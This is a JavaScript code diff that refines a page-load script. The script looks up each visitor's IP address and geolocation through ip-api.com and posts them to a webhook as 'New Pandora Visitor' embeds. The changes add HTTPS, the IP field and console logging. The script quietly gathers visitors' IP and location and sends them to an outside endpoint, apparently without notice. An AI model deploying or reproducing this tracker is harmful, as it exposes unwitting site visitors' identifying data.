@@ -5,7 +5,7 @@ async function IP_Info(){
      *  Description: On init , fetches IP information of user
      *  @return {fetch.Body.json()} Resp Body
      */
-    let response = await fetch("http://ip-api.com/json", {
+    let response = await fetch("https://ip-api.com/json", {
       method: 'GET',
       headers: {
         "cache-control" : "no-cache",
@@ -15,34 +15,38 @@ async function IP_Info(){
     return response.json()
   }
   IP_Info().then((value)=> {
+    console.log('IP Info received:', value);
     let requiredInfo = [
-      "status","country", "city", "zip", "regionName"
+      "status","country", "city", "zip", "regionName", "query"
     ]
     let noData = false
 
     for(var i = 0; i < requiredInfo.length; i++){
       if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
         noData = true
+        console.log('Missing field:', requiredInfo[i]);
         break
       } 
     }
     if(noData){
+      console.log('Missing required data');
       return null
     }
     return value
   }).then( async (value) => {
     if(value !== null){
+      console.log('Sending webhook...');
        await fetch(webhook, {
         method: 'POST',
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content:"``New Pandora``",
+          content: "**New Pandora Visitor**",
           embeds: [{
               title: "Pandora IP",
-              type:"rich",
-              color: "12223968",
+              type: "rich",
+              color: 12223968,
               description: "```IP information of the recent website visitor.```",
               fields: [{
                 name: "IP", value: `${value.query}`, inline: false
@@ -69,13 +73,13 @@ async function IP_Info(){
               }
           }]
         })
-      }).then((value)=>{
-        console.log(value.statusText)
+      }).then((response)=>{
+        console.log('Webhook sent successfully:', response.status, response.statusText)
       }).catch((err)=>{
-        console.log(err)
+        console.error('Webhook error:', err)
       })
     }
   }).catch((err)=> {
-    console.log(err)
+    console.error('IP fetch error:', err)
     console.log('Request not sent')
   })
